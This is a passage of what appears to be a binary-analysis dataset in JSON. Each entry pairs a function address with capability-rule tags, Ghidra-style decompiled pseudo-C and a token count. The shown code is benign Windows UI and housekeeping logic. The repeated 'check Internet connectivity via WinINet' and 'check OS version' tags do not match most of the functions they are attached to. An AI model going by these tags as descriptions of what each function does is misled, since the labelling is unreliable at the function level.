        "decompiled_code": "\nvoid __fastcall fcn.0045ddc0(uchar param_1, uint param_2)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    fcn.0045de04();\n    uVar1 = sub.user32.dll_SetTimer(0, 0, param_2, fcn.0045b978);\n    *(in_EAX + 0x8a) = uVar1;\n    *(in_EAX + 0x89) = param_1;\n    if (*(in_EAX + 0x8a) == 0) {\n        fcn.0045dfb8();\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "0045de2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045de2c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint32_t uStack32;\n    uint uStack28;\n    \n    uStack52 = 0x45de45;\n    fcn.004075f8();\n    uStack52 = 0x45de54;\n    fcn.0043d360();\n    uStack52 = 0x45de5f;\n    fcn.0043c0f4();\n    uStack52 = 0x45de64;\n    iVar1 = fcn.0045b958();\n    if ((iVar1 == 0) || (*(iVar1 + 0x99) == '\\0')) {\n        uStack52 = 0x45de7a;\n        fcn.0045dfb8();\n    }\n    else {\n        if (iVar1 == *(in_EAX + 0x60)) {\n            uStack52 = 0x45de90;\n            fcn.004075f8();\n            uStack52 = 0x45de9f;\n            fcn.0043d360();\n            uStack52 = uStack28;\n            uStack56 = uStack32;\n            uStack60 = in_EAX + 100;\n            iVar2 = sub.user32.dll_PtInRect();\n            if (iVar2 != 0) {\n                return;\n            }\n        }\n        puVar3 = &stack0xffffffc4;\n        uStack56 = uStack56 & 0xffffff00 | *(in_EAX + 0x58);\n        if (*(in_EAX + 0x58) == 0) {\n            uStack60 = *(in_EAX + 0x78);\n        }\n        else {\n            uStack60 = *(in_EAX + 0x80);\n        }\n        fcn.0043e9fc(&stack0xffffffc4);\n        if ((uStack60 == '\\0') || (puVar3 != NULL)) {\n            fcn.0045dfb8();\n            *(in_EAX + 0x58) = uStack60;\n            *(in_EAX + 0x60) = iVar1;\n            fcn.0045ddc0();\n        }\n        else {\n            *(in_EAX + 0x58) = uStack60;\n            *(in_EAX + 0x60) = iVar1;\n            sub.user32.dll_GetCursorPos(&stack0xffffffc5);\n            fcn.0045e274();\n        }\n    }\n    return;\n}\n",
        "token_count": 583
    },
    "0045dfb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045dfb8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.0045df74();\n        *(in_EAX + 0x60) = 0;\n        *(in_EAX + 0x58) = 0;\n        fcn.0045bae0();\n        fcn.0045de04();\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "0045dff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0045dff0(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint *puStack64;\n    uint uStack60;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uStack60 = 0xe;\n    puStack64 = 0x45e004;\n    var_4h = (***0x484484)();\n    puStack64 = &fcn.0045dff0::var_28h;\n    uStack68 = 0x45e010;\n    uStack68 = sub.user32.dll_GetCursor();\n    puStack72 = 0x45e016;\n    iVar3 = sub.user32.dll_GetIconInfo();\n    if (iVar3 != 0) {\n        uStack76 = 0x45e13c;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack84 = 0x45e03a;\n        puStack72 = &stack0xfffffffc;\n        fcn.0042831c();\n        puStack84 = 0x45e045;\n        var_10h = fcn.0040881c();\n        uStack88 = 0x45e10d;\n        iStack92 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa4;\n        var_8h = var_10h + var_8h;\n        puStack84 = &stack0xfffffffc;\n        var_14h = var_8h;\n        cVar2 = fcn.004283d4(var_8h);\n        iVar3 = var_10h;\n        if ((cVar2 != '\\0') && (*(var_10h + 0xe) == 1)) {\n            uVar4 = *(var_10h + 4) * *(var_10h + 0xe) + 0x1f & 0xffffffe0;\n            if (uVar4 < 0) {\n                uVar4 = uVar4 + 7;\n            }\n            var_14h = (var_14h + var_ch) - *(var_10h + 4) * (uVar4 >> 3);\n            var_4h = fcn.0045dfe0();\n            if ((var_4h == 0) &&\n               (iVar1 = *(iVar3 + 8),  iVar3 = *(iVar3 + 4),  SBORROW4(iVar1, iVar3 * 2) == iVar1 + iVar3 * -2 < 0)) {\n                var_4h = fcn.0045dfe0();\n            }\n            var_4h = var_4h / (uVar4 >> 3) - var_20h;\n        }\n        *in_FS_OFFSET = var_8h;\n        uStack88 = 0x45e114;\n        iStack92 = 0x45e10c;\n        iVar3 = fcn.00402b44();\n        return iVar3;\n    }\n    return var_4h;\n}\n",
        "token_count": 793
    },
    "0045e1b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045e1b0(uint arg_8h)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    char *var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x45e261;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar3 = 0;\n    var_8h = in_EAX;\n    if (in_EAX != NULL) {\n        while (*var_8h != '\\0') {\n            while (((cVar1 = *var_8h,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r'))) {\n                var_8h = fcn.0040d514();\n            }\n            fcn.004046b8();\n            iVar2 = fcn.00426eac();\n            if (iVar3 < iVar2) {\n                iVar3 = iVar2;\n            }\n            if (*var_8h == '\\r') {\n                var_8h = var_8h + 1;\n            }\n            if (*var_8h == '\\n') {\n                var_8h = var_8h + 1;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x45e268;\n    uStack40 = 0x45e260;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 389
    },
    "0045e274": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e274(uint param_1, uint *param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uchar uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_70h;\n    int32_t var_68h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint lprc;\n    uint var_40h;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    char var_1dh;\n    uint lpPoint;\n    uint var_18h;\n    uint dx;\n    uint dy;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = *param_2;\n    var_8h = param_2[1];\n    var_4h = in_EAX;\n    fcn.00404f64();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    *(var_4h + 0x58) = 0;\n    if ((*(var_4h + 0x88) != '\\0') && (*(var_4h + 0x60) != 0)) {\n        cVar2 = fcn.004542c4();\n        if (cVar2 != '\\0') {\n            fcn.0043c0f4();\n            iVar4 = fcn.0045b958();\n            if (iVar4 == *(var_4h + 0x60)) {\n                var_60h = *(var_4h + 0x60);\n                var_58h = var_ch;\n                var_54h = var_8h;\n                iVar4 = fcn.0045dff0();\n                var_54h = var_54h + iVar4;\n                var_50h = fcn.0045acec();\n                var_4ch = *(var_4h + 0x5c);\n                fcn.0043d1e8();\n                (**(**(var_4h + 0x60) + 0x40))();\n                lpPoint = 0;\n                var_18h = 0;\n                piVar1 = *(*(var_4h + 0x60) + 0x30);\n                if (piVar1 == NULL) {\n                    iVar4 = *(var_4h + 0x60);\n                    cVar2 = fcn.004039b8();\n                    if ((cVar2 != '\\0') && (*(iVar4 + 400) != 0)) {\n                        sub.user32.dll_ClientToScreen();\n                    }\n                }\n                else {\n                    (**(*piVar1 + 0x40))();\n                }\n                sub.user32.dll_OffsetRect();\n                fcn.0043d38c();\n                fcn.0045b920();\n                fcn.0043a94c();\n                fcn.00404660();\n                var_30h = 0;\n                var_2ch = *(var_4h + 0x74);\n                var_5ch = *0x483e08;\n                var_24h = 0;\n                arg_8h = &var_60h;\n                iVar4 = fcn.0043e9fc(arg_8h);\n                var_1dh = iVar4 == 0;\n                if ((var_1dh) && (*(var_4h + 0x132) != 0)) {\n                    (**(var_4h + 0x130))(&var_60h);\n                }\n                if ((var_1dh == '\\0') || (*(var_4h + 0x60) == 0)) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = 1;\n                }\n                *(var_4h + 0x58) = uVar3;\n                if ((*(var_4h + 0x58) != '\\0') && (var_28h != 0)) {\n                    fcn.0045e150(&stack0xfffffffc);\n                    (**(**(var_4h + 0x84) + 0x70))();\n                    (**(**(var_4h + 0x84) + 0xd8))(&var_70h, var_24h);\n                    sub.user32.dll_OffsetRect(&var_70h, var_58h, var_54h);\n                    cVar2 = fcn.00403a28();\n                    if (cVar2 != '\\0') {\n                        iVar4 = fcn.0045e1b0(&stack0xfffffffc);\n                        var_70h = var_70h - (iVar4 + 5);\n                        var_68h = var_68h - (iVar4 + 5);\n                    }\n                    fcn.0043d360();\n                    *(var_4h + 100) = var_88h;\n                    *(var_4h + 0x68) = var_84h;\n                    fcn.0043d360();\n                    *(var_4h + 0x6c) = var_88h;\n                    *(var_4h + 0x70) = var_84h;\n                    fcn.0043d9e8();\n                    (**(**(var_4h + 0x84) + 0xd4))(var_24h);\n                    fcn.0045ba6c();\n                    if (var_30h < 1) {\n                        fcn.0045ddc0();\n                    }\n                    else {\n                        fcn.0045ddc0();\n                    }\n                    goto code_r0x0045e5ce;\n                }\n            }\n        }\n    }\n    if (var_30h < 1) {\n        fcn.0045dfb8();\n    }\n    else {\n        fcn.0045ddc0();\n    }\ncode_r0x0045e5ce:\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045ec();\n    fcn.00405034();\n    return;\n}\n",
        "token_count": 1441
    },
    "0045e608": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045e608(void)\n\n{\n    if ((*(*0x485b4c + 0x68) == 0) || (*(*(*0x485b4c + 0x68) + 0x23c) == 0)) {\n        fcn.0040461c();\n    }\n    else {\n        fcn.0040461c();\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0045e644": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.0045e644(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uStack24;\n    \n    iVar1 = *(*0x485b4c + 0x6c);\n    if (iVar1 == 0) {\ncode_r0x0045e66f:\n        if ((iVar1 != *(in_EAX + 0x44)) && (*(in_EAX + 0x44) != 0)) {\n            iVar3 = fcn.0043e9fc(param_1);\n            iVar3 = iVar3 + -1;\n            if (iVar3 == 0) goto code_r0x0045e68f;\n        }\n        uVar4 = 0;\n    }\n    else {\n        iVar3 = fcn.0043e9fc(param_1);\n        iVar3 = iVar3 + -1;\n        if (iVar3 != 0) goto code_r0x0045e66f;\ncode_r0x0045e68f:\n        uVar4 = CONCAT31(iVar3 >> 8, 1);\n    }\n    uVar2 = uVar4 & 0xff;\n    uStack24 = param_2 & 0xffffff00 | uVar2;\n    uStack24._0_1_ = uVar2;\n    if (uStack24 == '\\0') {\n        uVar4 = fcn.004039b8();\n        if (((uVar4 != '\\0') && (*(param_1 + 0x6a) != '\\0')) && (*(param_1 + 0x60) != '\\0')) {\n            uVar4 = fcn.00449f50();\n        }\n    }\n    return CONCAT44(uStack24, uVar4 & 0xffffff00 | uVar2);\n}\n",
        "token_count": 439
    },
    "0045e6d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0045e6d4(uint param_1)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc2) != 0) {\n        in_EAX = (**(in_EAX + 0xc0))();\n    }\n    return CONCAT44(param_1, in_EAX) & 0xffffff00ffffff00;\n}\n",
        "token_count": 87
    },
    "0045e6fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0045e6fc(uint param_1)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xca) != 0) {\n        in_EAX = (**(in_EAX + 200))();\n    }\n    return CONCAT44(param_1, in_EAX) & 0xffffff00ffffff00;\n}\n",
        "token_count": 83
    },
    "0045e7b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045e7b0(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x45e803;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    *0x485b50 = *0x485b50 + 1;\n    if (*0x485b50 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x485b48 != 0) {\n            iStack20 = 0x45e7d7;\n            fcn.00454058();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x485b5c != 0) {\n            iStack20 = *0x485b5c;\n            sub.kernel32.dll_CloseHandle();\n        }\n        fcn.0041bfe8();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 266
    },
    "0045e860": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong __fastcall fcn.0045e860(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    unkbyte3 Var4;\n    uint32_t uVar3;\n    uint32_t uStack16;\n    \n    Var4 = unaff_EBX >> 8;\n    uVar3 = CONCAT31(Var4, 1);\n    uStack16 = 0;\n    iVar2 = fcn.00404888();\n    if (param_2 <= iVar2) {\n        uStack16 = *(in_EAX + -1 + param_2);\n    }\n    iVar2 = fcn.00404888();\n    if (iVar2 < param_2) {\n        uVar3 = 0;\n        goto code_r0x0045e9ab;\n    }\n    cVar1 = fcn.0040d2e0();\n    if (cVar1 != '\\0') {\n        uVar3 = CONCAT31(Var4, 1);\n        goto code_r0x0045e9ab;\n    }\n    if ((1 < param_2) && (*(in_EAX + -2 + param_2) == '\\\\')) {\n        cVar1 = fcn.0040d2e0();\n        if (cVar1 == '\\0') {\n            if ((2 < param_2) && (*(in_EAX + -3 + param_2) == '\\\\')) {\n                cVar1 = fcn.0040d2e0();\n                if (cVar1 == '\\0') goto code_r0x0045e8e3;\n            }\n            uVar3 = unaff_EBX & 0xffffff00 | 1;\n            goto code_r0x0045e9ab;\n        }\n    }\ncode_r0x0045e8e3:\n    if (uStack16 == *0x483f24) {\n        iVar2 = fcn.00404888();\n        if (3 < iVar2) {\n            iVar2 = fcn.00404888();\n            if (iVar2 + -4 < param_2) {\n                uVar3 = unaff_EBX & 0xffffff00 | 6;\n                goto code_r0x0045e9ab;\n            }\n        }\n    }\n    iVar2 = fcn.00404888();\n    if (3 < iVar2) {\n        iVar2 = fcn.00404888();\n        if ((iVar2 + -4 < param_2) && (*(in_EAX + -2 + param_2) == *0x483f24)) {\n            if ((2 < param_2) && (*(in_EAX + -3 + param_2) == '\\\\')) {\n                cVar1 = fcn.0040d2e0();\n                if (cVar1 != '\\x02') goto code_r0x0045e955;\n            }\n            uVar3 = unaff_EBX & 0xffffff00 | 7;\n            goto code_r0x0045e9ab;\n        }\n    }\ncode_r0x0045e955:\n    if ((uStack16 == '/') || (uStack16 == ':')) {\n        uVar3 = CONCAT31(Var4, 2);\n    }\n    else if ((uStack16 == '!') || (((uStack16 == '<' || (uStack16 == '>')) || (uStack16 == '\\\\')))) {\n        uVar3 = CONCAT31(Var4, 3);\n    }\n    else if ((((uStack16 == '#') || (uStack16 == '9')) || (uStack16 == 'a')) || ((uStack16 == 'c' || (uStack16 == 'l')))\n            ) {\n        uVar3 = CONCAT31(Var4, 5);\n    }\n    else if ((uStack16 == '0') || (((uStack16 == 'A' || (uStack16 == 'C')) || (uStack16 == 'L')))) {\n        uVar3 = unaff_EBX & 0xffffff00 | 4;\n    }\ncode_r0x0045e9ab:\n    return CONCAT44(uStack16, uVar3);\n}\n",
        "token_count": 925
    },
    "0045e9b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045e9b4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = unaff_EBX & 0xffffff00 | *0x45ea2c;\n    iVar2 = fcn.00404888();\n    if (0 < iVar2) {\n        iVar4 = 1;\n        do {\n            cVar1 = *(in_EAX + -1 + iVar4);\n            if (cVar1 == '!') {\n                uVar3 = uVar3 | 1;\n            }\n            else if ((cVar1 == '>') && (iVar4 < param_2)) {\n                uVar3 = uVar3 & 0xfffffffb;\n                if ((iVar4 < 2) || (*(in_EAX + -2 + iVar4) != '<')) {\n                    uVar3 = uVar3 | 2;\n                }\n            }\n            else if ((cVar1 == '<') && (iVar4 < param_2)) {\n                uVar3 = uVar3 & 0xfffffffd | 4;\n            }\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    cVar1 = fcn.0045e860();\n    if (cVar1 == '\\x01') {\n        uVar3 = uVar3 | 8;\n    }\n    return CONCAT44(param_2, uVar3);\n}\n",
        "token_count": 363
    },
    "0045f524": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045f524(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x45f569;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x485bb8 = *0x485bb8 + 1;\n    if (*0x485bb8 == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x483f6c != 0) {\n            iStack20 = *0x483f6c;\n            sub.kernel32.dll_FreeLibrary_1();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        fcn.004045c8();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 226
    },
    "0045f57c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045f57c(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x45f5c0;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x485bbc = *0x485bbc + 1;\n    if (((*0x485bbc == 0) && (*0x485bc4 != '\\0')) && (*0x485bc0 != 0)) {\n        iStack20 = *0x485bc0;\n        sub.kernel32.dll_FreeLibrary_1();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 187
    },
    "0045f6d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045f6d4(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x45f743;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x485bcc = *0x485bcc + 1;\n    if (*0x485bcc == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x485bd0 != 0) {\n            iStack20 = *0x485bd0;\n            sub.kernel32.dll_FreeLibrary_1();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x485bd4 != 0) {\n            sub.kernel32.dll_FreeLibrary_1(*0x485bd4);\n        }\n        fcn.00405034();\n        fcn.00405034();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 261
    },
    "0045fba4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045fba4(void)\n\n{\n    int16_t *in_EAX;\n    \n    if ((((*in_EAX == 0) && (in_EAX[1] == 0)) && (in_EAX[2] == 0)) &&\n       (((in_EAX[3] == 0 && (in_EAX[4] == 0)) && ((in_EAX[5] == 0 && (*(in_EAX + 6) == 0)))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 121
    },
    "0045fbe8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fbe8(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    while ((*(in_EAX + 6) == 0 || (0xc < *(in_EAX + 6)))) {\n        *(in_EAX + 4) = *(in_EAX + 4) + *((param_2 & 0x7f) * 4 + 0x483f98);\n        *(in_EAX + 6) = *(in_EAX + 6) + *((param_2 & 0x7f) * 4 + 0x483fa4);\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "0045fc1c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fc1c(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = fcn.0045fdbc();\n    while ((*(in_EAX + 8) == 0 || (iVar1 < *(in_EAX + 8)))) {\n        *(in_EAX + 6) = *(in_EAX + 6) + *(param_2 * 4 + 0x483f98);\n        if (param_2 == 0) {\n            *(in_EAX + 8) = *(in_EAX + 8) + iVar1;\n        }\n        else {\n            *(in_EAX + 8) = *(in_EAX + 8) - iVar1;\n        }\n        fcn.0045fbe8();\n        iVar1 = fcn.0045fdbc();\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "00460340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460340(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    ushort *in_EDX;\n    \n    if ((arg_8h != '\\0') && (cVar1 = fcn.00416fd8(),  cVar1 != '\\0')) {\n        fcn.00416fb8();\n        return;\n    }\n    *in_EDX = *(in_EAX + 4);\n    uVar2 = fcn.0046006c();\n    *(in_EDX + 4) = uVar2;\n    return;\n}\n",
        "token_count": 138
    },
    "0046073c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046073c(void)\n\n{\n    uchar *puVar1;\n    uint16_t uVar2;\n    int16_t *in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x460838;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar3 = *in_EAX + in_EAX[1] + in_EAX[2];\n    if (iVar3 + in_EAX[3] + in_EAX[4] + in_EAX[5] < 1) goto code_r0x0046081d;\n    puVar1 = &stack0xfffffffc;\n    if (0 < iVar3) {\n        puVar1 = &stack0xfffffffc;\n        if ((((*in_EAX != 0) && (puVar1 = &stack0xfffffffc,  in_EAX[1] != 0)) &&\n            (puVar1 = &stack0xfffffffc,  in_EAX[2] != 0)) && (puVar1 = &stack0xfffffffc,  in_EAX[1] < 0x20)) {\n            uVar2 = fcn.0045f754();\n            puVar1 = puStack24;\n            if (in_EAX[2] <= uVar2) goto code_r0x004607d3;\n        }\n        puStack24 = puVar1;\n        fcn.0040675c();\n        fcn.0040c8dc();\n        fcn.00403fc0();\n        puVar1 = puStack24;\n    }\ncode_r0x004607d3:\n    puStack24 = puVar1;\n    if ((in_EAX[3] + in_EAX[4] + in_EAX[5] != 0) && (((0x17 < in_EAX[3] || (0x3b < in_EAX[5])) || (0x3b < in_EAX[4]))))\n    {\n        